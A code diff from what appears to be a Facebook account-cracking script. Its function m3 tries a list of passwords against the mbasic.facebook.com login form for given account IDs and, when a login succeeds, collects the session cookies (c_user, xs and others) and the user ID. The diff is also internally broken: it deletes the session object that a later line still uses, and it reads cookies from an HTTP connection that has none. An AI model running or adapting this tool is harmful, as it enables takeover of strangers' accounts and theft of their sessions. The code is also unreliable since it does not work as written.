@@ -1212,7 +1212,6 @@ def m3(ids,pwv):
     ua = ua_valid()
     warna = random.choice(my_color)
     uger = random.choice(ugrn)
-    session = httpx.Client()
     try:
         for pas in pwv:
             conn = http.client.HTTPSConnection('mbasic.facebook.com')
@@ -1245,7 +1244,7 @@ def m3(ids,pwv):
     '/login/device-based/regular/login/?refsrc=deprecated&lwv=100',
     f'lsd=AVp-E35fJm4&jazoest=2818&m_ts=1722252731&li=un2nZmDzrsc7LWsoef_lNJ9l&try_number=0&unrecognized_tries=0&email={ids}&pass={pas}&login=Log+in&bi_xrwh=0',
     headers)
-            log_cookies=session.cookies.get_dict().keys()
+            log_cookies=conn.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                 cid = re.findall('c_user=(.*);xs',kuki)[0]
